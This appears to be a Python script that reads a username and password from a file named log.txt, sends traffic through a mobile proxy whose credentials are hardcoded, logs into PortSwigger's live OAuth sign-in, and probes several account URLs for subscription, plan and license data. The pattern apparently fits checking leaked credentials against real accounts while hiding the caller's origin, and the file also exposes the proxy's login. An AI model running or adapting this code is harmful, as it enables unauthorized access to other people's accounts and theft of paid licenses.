#!/usr/bin/env python3
"""Test MY ACCOUNT page and related endpoints"""

import requests
import json
from urllib.parse import urljoin, parse_qs, urlparse
import re

proxy_url = "http://buymobileproxycom:mugla9392@ankara8.buymobileproxy.com:8029"

# Read first account
with open("log.txt", 'r', encoding='utf-8') as f:
    for line in f:
        line = line.strip()
        if line and not line.startswith("#"):
            username, password = line.split(":", 1)
            username = username.strip()
            password = password.strip()
            break

print(f"[*] Test account: {username}\n")

# Create session
session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
session.proxies.update({'http': proxy_url, 'https': proxy_url})

# OAuth Login
print("[1] OAuth Login...")
auth_url = "https://login.portswigger.net/authorize?client_id=F1PNGMosqeuuNO5cKQzDesrY2XzvPWGz&redirect_uri=https://portswigger.net/signin-oidc&response_type=code&scope=openid+profile+email&code_challenge=BldXYnkHHNxMQttliGBK-tWU16bEzTbKyUsr9WnArgk&code_challenge_method=S256&response_mode=query"

try:
    resp = session.get(auth_url, allow_redirects=False, timeout=10)
    state = ""
    if resp.status_code in [301, 302, 303, 307, 308]:
        redirect_url = resp.headers.get('Location', '')
        if redirect_url and 'state=' in redirect_url:
            if not redirect_url.startswith('http'):
                redirect_url = urljoin("https://login.portswigger.net/", redirect_url)
            parsed = parse_qs(urlparse(redirect_url).query)
            if 'state' in parsed:
                state = parsed['state'][0]
            resp = session.get(redirect_url, allow_redirects=False, timeout=10)

    # Login
    login_url = f"https://login.portswigger.net/u/login"
    if state:
        login_url = f"{login_url}?state={state}"

    login_data = {
        "username": username,
        "password": password,
        "action": "default"
    }

    resp = session.post(login_url, data=login_data, allow_redirects=False, timeout=10)
    if resp.status_code in [301, 302, 303, 307, 308]:
        redirect_url = resp.headers.get('Location', '')
        if redirect_url:
            if not redirect_url.startswith('http'):
                redirect_url = urljoin("https://login.portswigger.net/", redirect_url)
            resp = session.get(redirect_url, allow_redirects=True, timeout=10)

    print(f"[✓] Login successful\n")
except Exception as e:
    print(f"[✗] Login error: {e}\n")
    exit(1)

# Test MY ACCOUNT related endpoints
print("[2] Testing MY ACCOUNT endpoints:")
print("=" * 80)

my_account_urls = [
    "https://portswigger.net/my-account",
    "https://portswigger.net/#/my-account",
    "https://portswigger.net/account/my-account",
    "https://portswigger.net/api/my-account",
    "https://portswigger.net/user/account",
    "https://portswigger.net/dashboard/account",
]

for url in my_account_urls:
    try:
        resp = session.get(url, allow_redirects=True, timeout=10)
        print(f"\n[{resp.status_code}] {url}")

        if resp.status_code == 200:
            print(f"  ✓ Success!")

            # Check for subscription data
            if "subscription" in resp.text.lower():
                print("  ✓ Found 'subscription' keyword")
            if "plan" in resp.text.lower():
                print("  ✓ Found 'plan' keyword")
            if "license" in resp.text.lower():
                print("  ✓ Found 'license' keyword")

            # Extract JSON if present
            try:
                data = resp.json()
                print(f"  JSON Response:\n{json.dumps(data, indent=2)[:500]}")
            except:
                # Look for JSON in HTML
                json_matches = re.findall(r'\{[^{}]*"[^"]*"[^{}]*\}', resp.text)
                if json_matches:
                    print(f"  Found JSON in HTML:")
                    for match in json_matches[:3]:
                        print(f"    {match[:100]}")

                # Look for data attributes
                data_attrs = re.findall(r'data-.*?="([^"]*)"', resp.text)
                if data_attrs:
                    print(f"  Found data attributes:")
                    for attr in data_attrs[:3]:
                        if len(attr) > 10:
                            print(f"    {attr[:100]}")
    except Exception as e:
        print(f"\n[E] {url}: {str(e)[:50]}")

print("\n" + "=" * 80)
print("[*] Scan completed")
